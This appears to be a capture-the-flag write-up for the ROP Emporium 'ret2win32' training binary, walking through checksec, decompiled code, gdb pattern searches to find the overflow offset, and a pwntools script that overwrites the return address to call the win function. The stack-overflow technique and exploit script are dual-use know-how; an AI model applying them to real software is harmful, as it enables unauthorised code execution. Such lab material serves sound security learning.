---
layout: post
title: ROP Emporium - ret2win32
---

### Checksec
```
Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

### Check main function
```c
undefined4 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("32bits\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

### Check vuln function
```c
void pwnme(void)
{
  char local_2c [40];
  
  memset(local_2c,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stackbuffer;\nWhat could possibly go wrong?"
      );
  puts(
      "You there madam, may I have your input please? And don\'t worry about null bytes, we\'reusing fgets!\n"
      );
  printf("> ");
  fgets(local_2c,0x32,stdin);
  return;
}
```

### Check win function
```
gef➤  info functions 
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048470  __gmon_start__@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x08048659  ret2win
0x08048690  __libc_csu_init
0x080486f0  __libc_csu_fini
0x080486f4  _fini
```

```
gef➤  disassemble ret2win 
Dump of assembler code for function ret2win:
   0x08048659 <+0>:     push   ebp
   0x0804865a <+1>:     mov    ebp,esp
   0x0804865c <+3>:     sub    esp,0x8
   0x0804865f <+6>:     sub    esp,0xc
   0x08048662 <+9>:     push   0x8048824
   0x08048667 <+14>:    call   0x8048400 <printf@plt>
   0x0804866c <+19>:    add    esp,0x10
   0x0804866f <+22>:    sub    esp,0xc
   0x08048672 <+25>:    push   0x8048841
   0x08048677 <+30>:    call   0x8048430 <system@plt>
   0x0804867c <+35>:    add    esp,0x10
   0x0804867f <+38>:    nop
   0x08048680 <+39>:    leave  
   0x08048681 <+40>:    ret    
End of assembler dump.
```

### Initial
```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
```

### Check registers (EIP)
```
$eax   : 0xffffcc40  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$ebx   : 0x0       
$ecx   : 0xffffcc40  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$edx   : 0xf7f9789c  →  0x00000000
$esp   : 0xffffcc70  →  0xf7fe006d  →  0x80002674 ("t&"?)
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xf7f96000  →  0x001d7d6c ("l}"?)
$edi   : 0x0       
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
```

### Check length buffer to overflow return function
```
gef➤  pattern search laaa
[+] Searching 'laaa'
[+] Found at offset 41 (little-endian search) likely
[+] Found at offset 44 (big-endian search)
```

### Payload
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('ret2win32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = '\x90' * cyclic_find('laaa')

rop = ROP(exe)
rop.call('ret2win', [])

io.sendline(payload + rop.__str__())
io.interactive()
```